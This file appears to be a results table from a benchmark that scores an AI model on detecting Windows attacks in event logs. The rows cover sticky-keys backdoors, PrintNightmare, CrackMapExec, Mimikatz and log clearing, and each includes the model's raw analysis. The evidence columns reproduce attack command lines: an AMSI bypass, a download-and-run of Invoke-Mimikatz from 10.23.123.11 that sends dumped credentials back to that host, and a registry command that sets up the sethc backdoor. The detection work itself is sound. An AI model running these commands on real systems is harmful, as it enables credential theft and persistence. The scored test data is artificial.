# DETECTION BENCHMARK RESULTS - column glossary
# ----------------------------------------------------------------------
# Model               LLM model id used to score this run
# Filename            Source artifact analyzed (EVTX file or CSV stem)
# Difficulty          Tag from metadata.json: easy / medium / hard
# Test Set            A=Known Pattern, B=Obfuscated, C=Noise-heavy, D=Benign
# Status              processed | error | context_exceeded
# Malicious           Model verdict: YES (attack) or NO (routine/benign)
# Confidence %        Heuristic confidence from response structure quality, not model-stated (0-100)
# Alignment %         Share of cited evidence found verbatim in source (0-100)
# Structure Valid     Response parsed cleanly into the required sections
# Event IDs           Event IDs extracted from the model's EVIDENCE block
# Processes           Process names extracted from the model's EVIDENCE block
# Accounts            Account names extracted from the model's EVIDENCE block
# Commands            Command lines / script blocks extracted from EVIDENCE
# Network             IPs / hostnames / shares extracted from EVIDENCE
# Registry            Registry keys / values extracted from EVIDENCE
# Hallucination %     Share of cited evidence not found in source events (0-100)
# Response Time (s)   Wall-clock seconds from prompt sent to response received
# Extraction (6)      Did the model find the right evidence? (0-6)
# Interpretation (6)  Did it correctly explain what the evidence implies? (0-6)
# NoHallucination (4) 4 = no fabricated evidence, 0 = heavy fabrication
# Reasoning (4)       Quality of the chain of reasoning in EXPLANATION (0-4)
# Total (20)          Sum of the four criteria above (0-20)
# Grade               Letter grade from Total: A>=17, B>=14, C>=10, D<10
# LLM Response        Full raw text the model returned, before any parsing
#
# Skip these lines in pandas:  pd.read_csv(path, comment='#')
# ----------------------------------------------------------------------
Model,Filename,Difficulty,Test Set,Status,Malicious,Confidence %,Alignment %,Structure Valid,Event IDs,Processes,Accounts,Commands,Network,Registry,Hallucination %,Response Time (s),Extraction (6),Interpretation (6),NoHallucination (4),Reasoning (4),Total (20),Grade,LLM Response
gpt-5.5-2026-04-23,"ID12,13-Stickey key registry update.evtx",easy,A,processed,YES,100.0,91.7,YES,"12, 13","C:\Windows\system32\reg.exe, C:\windows\system32\cmd.exe",,,srvdefender01.offsec.lan,"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe, HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\Debugger",0.0,6.96,5.5,5.0,4.0,3,17.5,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 12, 13
- Processes: C:\Windows\system32\reg.exe, C:\windows\system32\cmd.exe
- Accounts: None
- Commands: None
- Network: srvdefender01.offsec.lan
- Registry: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe, HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\Debugger

EXPLANATION:
The events show creation and modification of an Image File Execution Options key for sethc.exe using reg.exe. The Debugger value is set to C:\windows\system32\cmd.exe, which matches Image File Execution Options injection behavior and can be used to launch cmd.exe when sethc.exe is invoked."
gpt-5.5-2026-04-23,ID4656-Failed sethc replacement by CMD.evtx,easy,A,processed,YES,100.0,75.0,YES,"1102, 4656","C:\Windows\System32\cmd.exe, C:\Windows\System32\sethc.exe",admmig,,srvdefender01.offsec.lan,,0.0,9.12,4.5,6.0,4.0,3,17.5,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4656
- Processes: C:\Windows\System32\cmd.exe, C:\Windows\System32\sethc.exe
- Accounts: admmig
- Commands: None
- Network: srvdefender01.offsec.lan
- Registry: None

EXPLANATION:
Event ID 1102 shows the Security log was cleared by admmig, followed seconds later by repeated Event ID 4656 access attempts to C:\Windows\System32\sethc.exe from C:\Windows\System32\cmd.exe. The combination of log clearing and command-shell access to sethc.exe indicates suspicious attack behavior rather than routine activity."
gpt-5.5-2026-04-23,ID4688-Stickey command reg update + execution.evtx,easy,A,processed,YES,100.0,90.0,YES,4688,"C:\Windows\System32\reg.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\cscript.exe, C:\Windows\System32\winlogon.exe, C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe","admmig, SRVDEFENDER01$","REG  ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"" /t REG_SZ /v Debugger /d ""C:\windows\system32\cmd.exe"" /f, C:\windows\system32\cmd.exe sethc.exe 211, \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs""",srvdefender01.offsec.lan,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe,0.0,28.65,5.4,6.0,4.0,3,18.4,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688
- Processes: C:\Windows\System32\reg.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\cscript.exe, C:\Windows\System32\winlogon.exe, C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe
- Accounts: admmig, SRVDEFENDER01$
- Commands: REG  ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"" /t REG_SZ /v Debugger /d ""C:\windows\system32\cmd.exe"" /f, C:\windows\system32\cmd.exe sethc.exe 211, \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs""
- Network: srvdefender01.offsec.lan
- Registry: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe

EXPLANATION:
The logs show admmig using reg.exe to add an Image File Execution Options Debugger value for sethc.exe pointing to cmd.exe. Shortly after, winlogon.exe launches cmd.exe with sethc.exe in the command line, matching a sticky keys/IFEO backdoor pattern for unauthorized command execution."
gpt-5.5-2026-04-23,1-Print spool spawned a CMD shell (PrintNightMare).evtx,easy,A,processed,YES,100.0,100.0,YES,1,"C:\Windows\System32\cmd.exe, C:\Windows\System32\spoolsv.exe",NT AUTHORITY\SYSTEM,"""cmd.exe"", C:\Windows\System32\spoolsv.exe",,,0.0,4.86,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1
- Processes: C:\Windows\System32\cmd.exe, C:\Windows\System32\spoolsv.exe
- Accounts: NT AUTHORITY\SYSTEM
- Commands: ""cmd.exe"", C:\Windows\System32\spoolsv.exe
- Network: None
- Registry: None

EXPLANATION:
The event shows C:\Windows\System32\spoolsv.exe spawning C:\Windows\System32\cmd.exe as NT AUTHORITY\SYSTEM. A command shell launched by the print spooler service under SYSTEM is suspicious and consistent with command execution abuse rather than routine activity."
gpt-5.5-2026-04-23,"ID316,300,301,316,823,848-Mimispool printer server instal.evtx",easy,A,processed,NO,100.0,50.0,YES,"823, 302, 849, 301, 316, 848, 300","spoolsv.exe, winspool.drv",,,fs03vuln.offsec.lan,,0.0,14.62,3.0,1.0,4.0,2,10.0,C,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 823, 302, 849, 301, 316, 848, 300
- Processes: spoolsv.exe, winspool.drv
- Accounts: None
- Commands: None
- Network: fs03vuln.offsec.lan
- Registry: None

EXPLANATION:
The events show printer configuration activity involving Kiwi Legit Printer, including deletion, creation, sharing changes, default printer selection, and addition of the Generic / Text Only driver. No accounts, command lines, registry keys, external hosts, or clearly malicious payload paths are present in the logs, so this appears to be routine printer administration based on the provided evidence."
gpt-5.5-2026-04-23,ID354-808-Mimispool printer installation (PrintNightmare).evtx,easy,A,processed,YES,100.0,100.0,YES,"316, 300, 304, 306, 354, 823, 808, 302, 301, 317",spoolsv.exe,,,"FS03.offsec.lan, fs03vuln",,0.0,12.96,6.0,6.0,4.0,2,18.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 316, 300, 304, 306, 354, 823, 808, 302, 301, 317
- Processes: spoolsv.exe
- Accounts: None
- Commands: None
- Network: FS03.offsec.lan, fs03vuln
- Registry: None

EXPLANATION:
The logs show rapid printer creation, configuration changes, default printer change, failed plugin loads, and deletion within the same second. The attempted load of \\fs03vuln\print$\W32X86\3\mimispool.dll and C:\Windows\system32\spool\DRIVERS\x64\3mimispool.dll tied to \\fs03vuln\Kiwi Legit Printer is suspicious printer-driver/plugin activity rather than routine printing."
gpt-5.5-2026-04-23,"ID4688,6416,4648-SystemNightMare.evtx",easy,A,processed,YES,100.0,93.3,YES,"1102, 4688, 4648, 4690, 4658, 4656, 6416","C:\Windows\System32\net.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\rundll32.exe, C:\Windows\System32\spoolsv.exe, C:\Windows\System32\svchost.exe, C:\Windows\System32\drvinst.exe, C:\Windows\System32\conhost.exe","admmig, gentilguest, FS01$","net  use \\printnightmare.gentilkiwi.com\ipc$ /user:gentilguest password, rundll32  printui.dll,PrintUIEntry /in /n""\\printnightmare.gentilkiwi.com\Kiwi Legit Printer"", DrvInst.exe ""4"" ""d"" ""C:\Windows\system32\spool\{FB290F8D-907E-440F-B071-82ECFEE67D2B}\ntprint.inf"" ""9"" ""4d2985097"" ""0000000000000AEC"" ""WinSta0\Default"" ""0000000000000D8C"" ""208"" ""C:\Windows\system32\spool\{FB290F8D-907E-440F-B071-82ECFEE67D2B}"", DrvInst.exe ""4"" ""d"" ""C:\Windows\system32\spool\{C3445CE2-E050-40AC-972D-6D9E24646E8F}\prnge001.inf"" ""9"" ""4d6061107"" ""0000000000000F34"" ""WinSta0\Default"" ""0000000000000E50"" ""208"" ""C:\Windows\system32\spool\{C3445CE2-E050-40AC-972D-6D9E24646E8F}"", DrvInst.exe ""1"" ""0"" ""SWD\PRINTENUM\{F98719DA-2EAC-4BAB-B347-A1C4BA29442C}"" """" """" ""4f51462e7"" ""0000000000000000"", ""cmd.exe"", \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1","fs01.offsec.lan, printnightmare.gentilkiwi.com, 20.188.56.147","\REGISTRY\MACHINE\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates, \REGISTRY\MACHINE\SOFTWARE\Policies\Microsoft\SystemCertificates\Root\Certificates, \REGISTRY\MACHINE\SOFTWARE\Microsoft\EnterpriseCertificates\Root\Certificates",0.0,20.40,5.6,6.0,4.0,4,19.6,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688, 4648, 4690, 4658, 4656, 6416
- Processes: C:\Windows\System32\net.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\rundll32.exe, C:\Windows\System32\spoolsv.exe, C:\Windows\System32\svchost.exe, C:\Windows\System32\drvinst.exe, C:\Windows\System32\conhost.exe
- Accounts: admmig, gentilguest, FS01$
- Commands: net  use \\printnightmare.gentilkiwi.com\ipc$ /user:gentilguest password, rundll32  printui.dll,PrintUIEntry /in /n""\\printnightmare.gentilkiwi.com\Kiwi Legit Printer"", DrvInst.exe ""4"" ""d"" ""C:\Windows\system32\spool\{FB290F8D-907E-440F-B071-82ECFEE67D2B}\ntprint.inf"" ""9"" ""4d2985097"" ""0000000000000AEC"" ""WinSta0\Default"" ""0000000000000D8C"" ""208"" ""C:\Windows\system32\spool\{FB290F8D-907E-440F-B071-82ECFEE67D2B}"", DrvInst.exe ""4"" ""d"" ""C:\Windows\system32\spool\{C3445CE2-E050-40AC-972D-6D9E24646E8F}\prnge001.inf"" ""9"" ""4d6061107"" ""0000000000000F34"" ""WinSta0\Default"" ""0000000000000E50"" ""208"" ""C:\Windows\system32\spool\{C3445CE2-E050-40AC-972D-6D9E24646E8F}"", DrvInst.exe ""1"" ""0"" ""SWD\PRINTENUM\{F98719DA-2EAC-4BAB-B347-A1C4BA29442C}"" """" """" ""4f51462e7"" ""0000000000000000"", ""cmd.exe"", \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
- Network: fs01.offsec.lan, printnightmare.gentilkiwi.com, 20.188.56.147
- Registry: \REGISTRY\MACHINE\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates, \REGISTRY\MACHINE\SOFTWARE\Policies\Microsoft\SystemCertificates\Root\Certificates, \REGISTRY\MACHINE\SOFTWARE\Microsoft\EnterpriseCertificates\Root\Certificates

EXPLANATION:
The events show admmig clearing the Security log, then using net.exe with gentilguest credentials to connect to printnightmare.gentilkiwi.com and running rundll32 printui.dll to add \\printnightmare.gentilkiwi.com\Kiwi Legit Printer. The subsequent printer/driver installation activity is followed by C:\Windows\System32\spoolsv.exe spawning C:\Windows\System32\cmd.exe as FS01$, which indicates malicious execution through the print spooler chain."
gpt-5.5-2026-04-23,"4624,4674,4688- CrackMap Exec SMB mimikatz.evtx",easy,B,processed,YES,100.0,76.4,YES,"4624, 4674, 4688","C:\Windows\System32\services.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\wbem\WmiPrvSE.exe","ANONYMOUS LOGON, admmig, FS03VULN$","cmd.exe /Q /c powershell.exe -exec bypass -noni -nop -w 1 -C, powershell.exe  -exec bypass -noni -nop -w 1 -C, \??\C:\Windows\system32\conhost.exe 0xffffffff, C:\Windows\SYSTEM32\cmd.exe /c ""C:\tools\shell.cmd""","fs03vuln.offsec.lan, 10.23.123.11","\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\WinSock2\Parameters, \REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PERFLIB",0.0,44.38,4.6,6.0,4.0,4,18.6,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4624, 4674, 4688
- Processes: C:\Windows\System32\services.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\wbem\WmiPrvSE.exe, C:\Windows\SYSTEM32\cmd.exe
- Accounts: ANONYMOUS LOGON, admmig, FS03VULN$
- Commands: cmd.exe /Q /c powershell.exe -exec bypass -noni -nop -w 1 -C, powershell.exe  -exec bypass -noni -nop -w 1 -C, \??\C:\Windows\system32\conhost.exe 0xffffffff, C:\Windows\SYSTEM32\cmd.exe /c ""C:\tools\shell.cmd""
- Network: fs03vuln.offsec.lan, 10.23.123.11
- Registry: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\WinSock2\Parameters, \REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PERFLIB

EXPLANATION:
The events show repeated 4624 network logons for admmig from 10.23.123.11 followed immediately by 4688 process creation of cmd.exe and powershell.exe using -exec bypass -noni -nop -w 1 -C. The PowerShell execution is accompanied by multiple 4674 privileged access events and later SYSTEM context execution of C:\Windows\SYSTEM32\cmd.exe /c ""C:\tools\shell.cmd"", which together indicate malicious remote execution and privilege abuse."
gpt-5.5-2026-04-23,ID1-CrackMapExec payload execution.evtx,easy,B,processed,YES,100.0,75.0,YES,1,"C:\Windows\System32\cmd.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\wbem\WmiPrvSE.exe",OFFSEC\admmig,"cmd.exe /Q /c powershell.exe -exec bypass -noni -nop -w 1 -C, powershell.exe  -exec bypass -noni -nop -w 1 -C, C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding",win10-02.offsec.lan,,0.0,30.17,4.5,6.0,4.0,4,18.5,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1
- Processes: C:\Windows\System32\cmd.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\wbem\WmiPrvSE.exe
- Accounts: OFFSEC\admmig
- Commands: cmd.exe /Q /c powershell.exe -exec bypass -noni -nop -w 1 -C, powershell.exe  -exec bypass -noni -nop -w 1 -C, C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
- Network: win10-02.offsec.lan
- Registry: None

EXPLANATION:
The events show WmiPrvSE.exe launching cmd.exe, which then launches powershell.exe under OFFSEC\admmig with High integrity. The PowerShell command uses -exec bypass, -noni, -nop, -w 1, and a heavily obfuscated -JOIN and sPlIT pattern, which is consistent with malicious script execution rather than routine administration."
gpt-5.5-2026-04-23,ID400-800-CrackMapExec payload execution.evtx,easy,A,processed,YES,100.0,100.0,YES,"600, 400, 800, 403",powershell.exe,OFFSEC\admmig,powershell.exe -exec bypass -noni -nop -w 1 -C | if ( &amp | { Set-StrictMode -Version 1 | $_.PSMessageDetails } ) { | &amp | $this.Exception.InnerException.PSMessageDetails } | $errorCategoryMsg = &amp | $_.ErrorCategory_Message } | $originInfo = &amp | $_.OriginInfo },win10-02.offsec.lan,,16.7,31.57,6.0,6.0,3.3,4,19.3,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 600, 400, 800, 403
- Processes: powershell.exe
- Accounts: OFFSEC\admmig
- Commands: powershell.exe -exec bypass -noni -nop -w 1 -C; if ( &amp; { Set-StrictMode -Version 1; $_.PSMessageDetails } ) {; &amp; { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }; $errorCategoryMsg = &amp; { Set-StrictMode -Version 1; $_.ErrorCategory_Message }; $originInfo = &amp; { Set-StrictMode -Version 1; $_.OriginInfo }
- Network: win10-02.offsec.lan
- Registry: None

EXPLANATION:
The logs show powershell.exe launched with -exec bypass -noni -nop -w 1 -C and a heavily obfuscated HostApplication command under OFFSEC\admmig. Event ID 800 records the result: ""This script contains malicious content and has been blocked by your antivirus software."", indicating the PowerShell activity was malicious."
gpt-5.5-2026-04-23,ID4103-4104-CrackMapExec payload execution.evtx,medium,A,processed,YES,100.0,61.5,YES,"4104, 4103",powershell.exe,OFFSEC\admmig,"powershell.exe -exec bypass -noni -nop -w 1 -C | Invoke-Expression | Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}, try{, [Ref].Assembly.GetType('Sys'+'tem.Man'+'agement.Aut'+'omation.Am'+'siUt'+'ils').GetField('am'+'siIni'+'tFailed', 'NonP'+'ublic,Sta'+'tic').SetValue($null, $true), }catch{}, [Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}, [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12', IEX (New-Object Net.WebClient).DownloadString('https://10.23.123.11:443/Invoke-Mimikatz.ps1'), $cmd = Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit', $request = [System.Net.WebRequest]::Create('https://10.23.123.11:443/'), $request.Method = 'POST', $request.ContentType = 'application/x-www-form-urlencoded', $bytes = [System.Text.Encoding]::ASCII.GetBytes($cmd), $request.ContentLength = $bytes.Length, $requestStream = $request.GetRequestStream(), $requestStream.Write($bytes, 0, $bytes.Length), $requestStream.Close(), $request.GetResponse()","win10-02.offsec.lan, 10.23.123.11",,0.0,17.18,3.7,6.0,4.0,4,17.7,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4104, 4103
- Processes: powershell.exe
- Accounts: OFFSEC\admmig
- Commands: powershell.exe -exec bypass -noni -nop -w 1 -C; Invoke-Expression; [Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}, try{, [Ref].Assembly.GetType('Sys'+'tem.Man'+'agement.Aut'+'omation.Am'+'siUt'+'ils').GetField('am'+'siIni'+'tFailed', 'NonP'+'ublic,Sta'+'tic').SetValue($null, $true), }catch{}, [Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}, [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12', IEX (New-Object Net.WebClient).DownloadString('https://10.23.123.11:443/Invoke-Mimikatz.ps1'), $cmd = Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit', $request = [System.Net.WebRequest]::Create('https://10.23.123.11:443/'), $request.Method = 'POST', $request.ContentType = 'application/x-www-form-urlencoded', $bytes = [System.Text.Encoding]::ASCII.GetBytes($cmd), $request.ContentLength = $bytes.Length, $requestStream = $request.GetRequestStream(), $requestStream.Write($bytes, 0, $bytes.Length), $requestStream.Close(), $request.GetResponse()
- Network: win10-02.offsec.lan, 10.23.123.11
- Registry: None

EXPLANATION:
The PowerShell activity uses powershell.exe with -exec bypass, -noni, and -nop, then runs Invoke-Expression on obfuscated content. The decoded command downloads Invoke-Mimikatz.ps1 from 10.23.123.11 and attempts Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit', with the log stating the script was blocked as malicious content."
gpt-5.5-2026-04-23,ID4688-Obfuscated payload transfer via service name - Tchopper.evtx,easy,B,processed,YES,100.0,75.4,YES,4688,"C:\Windows\System32\cmd.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\wbem\WmiPrvSE.exe, C:\Windows\System32\dllhost.exe","FS03$, admmig","c:\windows\system32\cmd.exe /c powershell -command ""Get-Service ""seg1"" | select -Expand DisplayName |out-file -append tmp_payload.txt"", powershell  -command ""Get-Service ""seg1"" | select -Expand DisplayName |out-file -append tmp_payload.txt"", c:\windows\system32\cmd.exe /c powershell -command ""Get-Service ""seg244"" | select -Expand DisplayName |out-file -append tmp_payload.txt"", powershell  -command ""Get-Service ""seg244"" | select -Expand DisplayName |out-file -append tmp_payload.txt"", \??\C:\Windows\system32\conhost.exe 0xffffffff, C:\Windows\system32\wbem\wmiprvse.exe -Embedding, C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",FS03.offsec.lan,,0.0,45.25,4.5,6.0,4.0,4,18.5,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688
- Processes: C:\Windows\System32\cmd.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\wbem\WmiPrvSE.exe, C:\Windows\System32\dllhost.exe
- Accounts: FS03$, admmig
- Commands: c:\windows\system32\cmd.exe /c powershell -command ""Get-Service ""seg1"" | select -Expand DisplayName |out-file -append tmp_payload.txt"", powershell  -command ""Get-Service ""seg1"" | select -Expand DisplayName |out-file -append tmp_payload.txt"", c:\windows\system32\cmd.exe /c powershell -command ""Get-Service ""seg244"" | select -Expand DisplayName |out-file -append tmp_payload.txt"", powershell  -command ""Get-Service ""seg244"" | select -Expand DisplayName |out-file -append tmp_payload.txt"", \??\C:\Windows\system32\conhost.exe 0xffffffff, C:\Windows\system32\wbem\wmiprvse.exe -Embedding, C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
- Network: FS03.offsec.lan
- Registry: None

EXPLANATION:
The events show a highly repetitive pattern of cmd.exe launching powershell.exe to run Get-Service against sequential service names such as ""seg1"" and ""seg244"" and append DisplayName output to tmp_payload.txt. This repeated staged collection or reconstruction pattern under FS03$ is not routine administrative activity and is consistent with malicious payload assembly or discovery behavior."
gpt-5.5-2026-04-23,ID104-1102-Event log cleared.evtx,easy,A,processed,YES,100.0,100.0,YES,"104, 1102",,admmig,,FS03.offsec.lan,,0.0,7.21,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 104, 1102
- Processes: None
- Accounts: admmig
- Commands: None
- Network: FS03.offsec.lan
- Registry: None

EXPLANATION:
Multiple EventID 104 log-cleared events and an EventID 1102 Security log-cleared event occurred on FS03.offsec.lan under the same account, admmig. The repeated clearing of many channels including System, Security, Application, ForwardedEvents, and other Microsoft-Windows logs is consistent with defense evasion rather than routine isolated activity."
